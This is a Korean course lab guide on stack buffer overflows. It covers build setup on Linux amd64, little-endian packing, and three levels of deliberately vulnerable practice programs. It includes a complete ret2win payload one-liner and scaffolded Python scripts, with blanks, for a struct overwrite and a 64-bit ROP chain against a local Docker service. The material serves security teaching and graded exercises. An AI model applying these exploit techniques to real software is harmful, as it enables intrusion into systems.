# 3주차 실습 안내서 — Buffer Overflow (BOF & 64-bit ROP)

> 이 문서는 **어디서·어떤 명령으로 빌드하고 실행하는지**, 그리고 각 단계를 **어떻게 분석·접근하는지**를 안내합니다.
> Main/Hidden의 완성된 정답 페이로드는 담고 있지 않습니다. 오프셋·값은 여러분이 직접 분석해 채워 넣으세요.

---

## 0. 실행 환경 (가장 중요)

- **반드시 Linux amd64(x86_64) ELF 환경에서** Level 1·2를 빌드·실행하세요.
- ⚠️ **맥에서 그냥 `gcc`/`make` 하면 안 됩니다.** 애플 실리콘은 **arm64**, 인텔 맥은 x86_64여도 리눅스 ELF가 아니라 **Mach-O**가 만들어져서, 교안의 스택 배치·오프셋·가젯이 **전혀 맞지 않습니다.** (예: 같은 Level 1이 리눅스 amd64에선 `'A'*20`으로 안 뚫리는데 맥 arm64에선 뚫립니다 — 배치가 다르기 때문.)
- **채점 대상 Level 3**는 compose에 `platform: linux/amd64`가 지정돼 있어 **어느 OS에서도 동일하게** 동작하니 걱정하지 않아도 됩니다.

**Level 1·2를 amd64에서 빌드하는 방법 (아래 중 하나):**

1. **SEED 2.0 VM(Ubuntu 22.04) 또는 Windows WSL2(Ubuntu)** 안에서 그대로 `make` — `gdb`/`gef`/`checksec`이 이미 설치돼 있어 가장 편합니다.
2. **VM이 없으면 amd64 컨테이너 한 줄** — Mac·Windows·Linux 어디서든 결과가 동일합니다:
   ```bash
   # 02_bof 폴더에서 실행
   docker run --rm -it --platform linux/amd64 -v "$PWD":/w -w /w gcc:11 bash
   # ↓ 컨테이너 안에서:
   apt update && apt install -y gdb        # 분석 도구
   cd level1_intro && make && ./bof_intro  # Level 1
   cd ../level2_basic && make              # Level 2
   ```

빌드 전 환경 확인:
```bash
uname -m           # x86_64 여야 함 (aarch64/arm64면 환경이 잘못됨 → 위 컨테이너 사용)
gcc --version      # Ubuntu 11.x
```

---

## 1. 권장 학습 순서

문제 번호는 Level 1 → 2 → 3(Main/Hidden)이지만, **처음 배운다면 아래 순서로 이해하는 것을 권장**합니다.

1. **Level 1** — 긴 입력이 인접 변수(`is_admin`) 값을 바꾸는 "현상"을 눈으로 관찰
2. **Level 3 Main** — 오프셋과 리틀 엔디언으로 두 변수를 **정확히** 덮어쓰기
3. **Level 2** — 데이터를 넘어 **복귀 주소(RET)** 까지 바꾸기 (ret2win)
4. **Level 3 Hidden** — 레지스터 인자 전달(ROP)과 스택 정렬로 확장 *(심화)*

> **채점 대상은 Level 3 Main/Hidden** 입니다. Level 1·2는 로컬 연습(참여 점수)입니다.

---

## 1.5 리틀 엔디언 & 바이트 패킹 (초심자 필독)

페이로드에 주소·숫자를 넣을 때 **값이 거꾸로 들어가는** 이유입니다. x86_64는 **리틀 엔디언** — 낮은 바이트를 낮은 주소에 먼저 저장하므로, 메모리에서는 사람이 읽는 순서와 반대로 보입니다.

```text
값(사람이 읽는 순서):   0x de ad be ef      (MSB ... LSB)
메모리(낮은 주소 → 높은): ef be ad de         ← 뒤집힘!
```
```python
>>> import struct
>>> struct.pack("<I", 0xdeadbeef)   # "<"=리틀엔디언, I=uint32(4바이트)
b'\xef\xbe\xad\xde'
>>> struct.pack("<Q", 0x401176)     # Q=uint64(8바이트, 주소용)
b'\x76\x11\x40\x00\x00\x00\x00\x00'
```
- **규칙**: 주소·정수 값은 항상 `pack()`으로 변환해 넣습니다(손으로 뒤집지 말 것). `'A'` 같은 패딩 문자는 그대로 둡니다.
- 그래서 **Main은 4바이트 값 2개 → `p32`(`<I`) 두 번**, **Level 2·Hidden은 주소 → `p64`(`<Q`) 8바이트**로 넣습니다.

---

## 2. Level 1 — `bof_intro` (로컬 연습)

```bash
cd 02_bof/level1_intro
make
./bof_intro
```

- 구조: `char buffer[16]` 뒤(스택 상)에 `volatile int is_admin`.
- 목표: `read(0, buffer, 64)` 로 버퍼를 넘겨 `is_admin`을 0이 아닌 값으로 만들기.
- 오프셋 힌트: 프로그램이 출력하는 `buffer` / `is_admin` 주소의 **차이**를 직접 계산하세요. (gdb 없이도 주소가 출력됩니다.)

정상 출력 예시:
```text
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*32)" | ./bof_intro
 [*] Result is_admin     : 1094795585 (0x41414141)
[+] FLAG{bof_intro_practice}
```

---

## 3. Level 2 — `bof_ret2win` (로컬 연습)

```bash
cd 02_bof/level2_basic
make
./bof_ret2win
```

- 취약 함수 `vulnerable_function()` 안에 `char buffer[32]`, `read(0, buffer, 128)`.
- 목표: RET를 덮어 실행되지 않는 `win()` 함수로 점프.
- 오프셋: `버퍼(32) + Saved RBP(8) = 40` → 이후 8바이트에 `win()` 주소(리틀 엔디언 `p64`).
- `win()` 주소는 **실행할 때마다 프로그램이 출력**합니다(No-PIE라 빌드가 같으면 고정). 하드코딩하지 말고 출력값/`objdump -d ./bof_ret2win | grep win`으로 확인하세요.

```bash
python3 -c "import sys,struct; win=0x4011b6; \
sys.stdout.buffer.write(b'A'*40 + struct.pack('<Q', win))" | ./bof_ret2win
```
> `win` 값을 방금 확인한 본인 빌드 주소로 바꾸세요. 정상 시 `FLAG{bof_basic_practice}` 출력.

---

## 4. Level 3 — `vault_guard` (원격, 채점 대상)

```bash
cp .env.example .env         # .env 안의 STUDENT_ID 를 '본인 학번'으로 수정
docker compose up -d --build
nc localhost 9001
```
메뉴에서 **1 = Main**, **2 = Hidden** 을 선택합니다. 연결 시 프로그램이 버퍼/함수 주소를 출력해 줍니다.

### 4.1 네트워크 수신 보일러플레이트 (제공)

원격 문제에서 "올바른 페이로드인데 주소 파싱이 실패"하는 경우 대부분 **수신 타이밍** 문제입니다. 서버가 데이터를 여러 조각으로 나눠 보내기 때문입니다. 아래 `recv_until()` 을 사용해 **프롬프트가 도착할 때까지 누적 수신**하세요. (네트워크 디버깅은 이 과제의 목표가 아닙니다.)

```python
import socket, struct, re

HOST, PORT = "127.0.0.1", 9001

def recv_until(sock, markers, timeout=3.0):
    if isinstance(markers, (str, bytes)):
        markers = [markers]
    markers = [m.encode() if isinstance(m, str) else m for m in markers]
    sock.settimeout(timeout)
    buf = b""
    while not any(m in buf for m in markers):
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
    return buf

s = socket.socket(); s.connect((HOST, PORT))
print(recv_until(s, "Choice >").decode(errors="ignore"))
```

### 4.2 Main (스택 변수 정밀 덮어쓰기)

- 구조체(packed): `char user_buffer[64]; uint32_t auth_token; uint32_t target_role;`
- 통과 조건: `auth_token == 0xdeadbeef` **그리고** `target_role == 0x1337c0de` (둘 다 **4바이트 uint32**).
- 접근: 버퍼를 채운 뒤 두 4바이트 값을 **순서대로** 리틀 엔디언(`struct.pack("<I", ...)`)으로 배치합니다. 오프셋은 구조체 배치로부터 직접 계산하세요.

```python
s.sendall(b"1\n")
print(recv_until(s, "payload >").decode(errors="ignore"))

payload  = b"A" * ____        # TODO: 버퍼 오프셋
payload += struct.pack("<I", ____)   # TODO: auth_token
payload += struct.pack("<I", ____)   # TODO: target_role
s.sendall(payload + b"\n")
print(recv_until(s, ["FLAG{", "Denied"]).decode(errors="ignore"))
```

### 4.3 Hidden (64-bit ROP) — *심화*

Mode 2 진입 시 프로그램이 `Secret Vault Function` 과 `Gadget Hub (function base)` 주소를 출력합니다.

핵심 개념 (직접 계산·구성해야 하는 부분은 TODO):
- **오프셋**: `diag_buf` 는 `-O0` 빌드에서 `rbp-0x50`(80B)에 배치됩니다 → RET까지 `80 + 8(Saved RBP) = 88` 바이트. (반드시 `gdb`의 `disas challenge_2_rop_diagnostic` 에서 `lea -0x50(%rbp),%rax` 로 **직접 확인**하세요.)
- **가젯**: 출력되는 `gadget_hub` 는 **함수 시작 주소**입니다. 앞의 `endbr64`+프롤로그(8B) 뒤에 실제 `pop rdi; pop rsi; ret` 가젯이 있습니다. 단독 `ret` 가젯도 같은 함수 안에 있습니다. (오프셋은 `objdump -d` 로 확인)
- **호출 규약**: `secret_vault(key1, key2)` → `key1`은 `RDI`, `key2`는 `RSI`. 값은 프로그램의 오류 메시지가 알려줍니다.
- **스택 정렬**: `secret_vault` 내부의 `fopen()` 은 `movaps` 명령을 써서 **호출 시점에 스택이 16바이트 정렬**되어 있어야 합니다(어긋나면 SIGSEGV). 정렬이 맞지 않으면 `secret_vault` 앞에 **단독 `ret` 가젯 1개**(8바이트)를 끼워 맞춥니다.

```python
s.sendall(b"2\n")
diag = recv_until(s, "payload >").decode(errors="ignore")
vault  = int(re.search(r"Secret Vault Function\s*:\s*(0x[0-9a-fA-F]+)", diag).group(1), 16)
gadget = int(re.search(r"Gadget Hub[^:]*:\s*(0x[0-9a-fA-F]+)", diag).group(1), 16)

rop  = b"A" * ____                 # TODO: gdb로 확인한 RET 오프셋
rop += struct.pack("<Q", gadget + ____)   # TODO: pop rdi; pop rsi; ret
rop += struct.pack("<Q", ____)     # TODO: key1 -> rdi
rop += struct.pack("<Q", ____)     # TODO: key2 -> rsi
rop += struct.pack("<Q", gadget + ____)   # TODO: 정렬용 단독 ret
rop += struct.pack("<Q", vault)    # secret_vault(key1, key2)
s.sendall(rop)
print(recv_until(s, ["FLAG{", "AUTH ERROR"]).decode(errors="ignore"))
```

> Hidden은 **선택 심화**입니다. 6주차 ROP에서 더 깊이 다루므로, 3주차에는 위 스캐폴드를 채우는 수준까지만 도전해도 좋습니다.

---

## 5. GDB 빠른 참조 (SEED VM 또는 amd64 컨테이너)

```text
gdb -q ./bof_ret2win
(gdb) disas vulnerable_function       # 버퍼 위치(lea -0x??(%rbp)) 확인
(gdb) disas challenge_2_rop_diagnostic # diag_buf @ rbp-0x50 확인
(gdb) p win                           # 함수 주소
(gdb) b vulnerable_function
(gdb) run
(gdb) x/16gx $rsp                     # 스택 16워드 덤프
(gdb) i r rsp rbp                     # 레지스터
checksec --file=./vault_guard         # 보호기법(Canary/NX/PIE)
```

---

## 6. 보고서 & 채점

- **플래그 문자열만 제출하면 0점.** 다음을 반드시 서술하세요:
  1. 입력 전/후 무엇이 바뀌었는가 (주소·값 근거)
  2. 오프셋을 **어떤 주소 차이**로 구했는가 (gdb 화면 캡처/디스어셈블 근거)
  3. 버퍼 길이를 제한하면 결과가 어떻게 달라지는가 (방어 관점)
- Main/Hidden은 **본인이 작성한 solve 스크립트 + 취약점 분석 보고서**로 채점합니다.
- **본인 학번(STUDENT_ID) 플래그만 유효.** 타인 플래그·`docker exec`(root)·오프라인 계산 값 제출은 부정행위로 기록됩니다.

---

## 7. 자주 겪는 문제

| 증상 | 원인 | 해결 |
| --- | --- | --- |
| 오프셋이 교안과 다름 | 맥 네이티브 빌드(arm64/인텔 Mach-O) | SEED VM/WSL2 또는 `--platform linux/amd64 gcc:11` 컨테이너에서 빌드(0장) |
| "주소 파싱 실패" | 서버 응답을 한 번에 못 받음 | `recv_until()`로 프롬프트까지 누적 수신 |
| 입력이 잘린 듯함 | `read()`가 요청보다 적게 읽을 수 있음 | 한 번에 전송, 필요 시 반환 바이트 수 확인 |
| Hidden에서 즉시 죽음(SIGSEGV) | 스택 16B 정렬 안 맞음 | `secret_vault` 앞에 단독 `ret` 가젯 1개 추가 |
| 플래그가 `_default_` | `.env`의 STUDENT_ID 미설정 | `.env`에 본인 학번 설정 후 재빌드 |
